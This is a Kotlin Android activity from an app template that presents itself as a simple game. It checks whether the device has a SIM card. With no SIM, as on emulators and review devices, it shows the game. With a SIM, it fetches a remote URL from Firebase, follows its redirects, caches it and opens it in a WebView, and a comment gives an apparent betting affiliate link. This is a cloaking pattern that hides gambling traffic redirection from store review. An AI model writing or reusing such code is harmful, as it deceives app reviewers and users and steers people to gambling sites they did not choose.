package com.template.sample

import android.content.Context
import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.telephony.TelephonyManager
import android.view.View
import android.view.WindowManager
import android.widget.Toast
import com.google.firebase.FirebaseApp
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.template.sample.databinding.ActivityMainBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.withContext
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : BaseActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var db: FirebaseDatabase
    private lateinit var url: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        FirebaseApp.initializeApp(this)

        try {
            if (loadUrl() == "null" || loadUrl() == "") {
                if (getSimStatus(this)) {
                    requestUrl()
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            init()
        }
    }

    private fun loadToken(): String? {
        val sharedPreferences = getSharedPreferences("my_app", Context.MODE_PRIVATE)
        return sharedPreferences.getString("firebase_token", null)
    }

    private fun init() {
        setVisibility(binding.menuGroup, View.VISIBLE)
        setVisibility(binding.progressBar, View.GONE)
        setVisibility(binding.imageView, View.GONE)
        val simStatus = getSimStatus(this)
        val internetStatus = getInternetStatus(this)

        when (!simStatus) {
            true -> {
                replaceActivity(GameActivity())
            }
            false -> {
                setVisibility(binding.menuGroup, View.GONE)
                setVisibility(binding.progressBar, View.VISIBLE)
                setVisibility(binding.imageView, View.VISIBLE)

                if (!internetStatus) {
                    binding.textTitle.text = getString(R.string.internet_status_message)
                    showToast(getString(R.string.internet_status_message))

                    setVisibility(binding.menuGroup, View.VISIBLE)
                    setVisibility(binding.progressBar, View.GONE)
                    setVisibility(binding.imageView, View.GONE)
                    setVisibility(binding.textTitle, View.GONE)
                } else {
                    if (loadUrl() != "null") {
                        replaceActivity(WebActivity(), loadUrl())
                    }
                }
            }
        }

        binding.apply {

            buttonGame.setOnClickListener {
                replaceActivity(GameActivity())
            }

            buttonAbout.setOnClickListener {
                if (getInternetStatus(this@MainActivity)) {
                    replaceActivity(WebActivity(), URL_ABOUT)
                } else {
                    showToast(getString(R.string.internet_status_message))
                }
            }

            buttonSettings.setOnClickListener {
                replaceActivity(SettingsActivity())
            }
        }
    }

    private fun setVisibility(view: View, visibility: Int) {
        view.visibility = visibility
    }

    private fun getSimStatus(context: Context): Boolean {
        val telephonyManager =
            context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        return telephonyManager.simState != TelephonyManager.SIM_STATE_ABSENT
    }

    private fun requestUrl() {

        if (getInternetStatus(this@MainActivity)) {

            db = FirebaseDatabase.getInstance()
            val ref = db.reference.child("url")

            runBlocking {
                withContext(Dispatchers.IO) {

                    ref.addValueEventListener(object : ValueEventListener {
                        override fun onDataChange(dataSnapshot: DataSnapshot) {
                            url = dataSnapshot.getValue(String::class.java).toString()

                            println("Ваша ссылка FirebaseRD: $url")

                            //   https://a.ruusbets.com/click?pid=111271&offer_id=4997&l=1592482655

                            if (url == "null" || url == "") {

                                runOnUiThread {
                                    setVisibility(binding.menuGroup, View.VISIBLE)
                                    setVisibility(binding.progressBar, View.GONE)
                                    setVisibility(binding.imageView, View.GONE)
                                    replaceActivity(GameActivity())
                                }

                            } else {
                                runOnUiThread {
                                    saveUrl(getRedirectUrl(url))
                                    println("Ваша ссылка после редиректов: ${loadUrl()}")
                                    replaceActivity(WebActivity(), loadUrl())
                                }
                            }
                        }

                        override fun onCancelled(e: DatabaseError) {
                            e.toException().printStackTrace()
                            showToast("Error Firebase RD")
                        }
                    })
                }
            }
        }
    }

    private fun getRedirectUrl(urlString: String): String {
        var redirectedUrl = urlString
        runBlocking {
            withContext(Dispatchers.IO) {
                var connection: HttpURLConnection? = null
                try {
                    val url = URL(urlString)
                    connection = url.openConnection() as HttpURLConnection
                    connection.instanceFollowRedirects = false
                    connection.connect()

                    if (connection.responseCode in (300..399)) {
                        val redirectUrl = connection.getHeaderField("Location")
                        if (redirectUrl != null) {
                            redirectedUrl = getRedirectUrl(redirectUrl)
                        }
                    } else {
                        redirectedUrl = connection.url.toString()
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                } finally {
                    connection?.disconnect()
                }
            }
        }
        return redirectedUrl
    }

    private fun saveUrl(url: String) {
        val sharedPreferences: SharedPreferences =
            getSharedPreferences("SAVE_URL", Context.MODE_PRIVATE)
        val editor: SharedPreferences.Editor = sharedPreferences.edit()
        editor.apply {
            putString("URL", url)
        }.apply()
    }

    private fun loadUrl(): String {
        val sharedPreferences: SharedPreferences =
            getSharedPreferences("SAVE_URL", Context.MODE_PRIVATE)
        return sharedPreferences.getString("URL", "null").toString()
    }

    private fun showToast(message: String) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
    }

}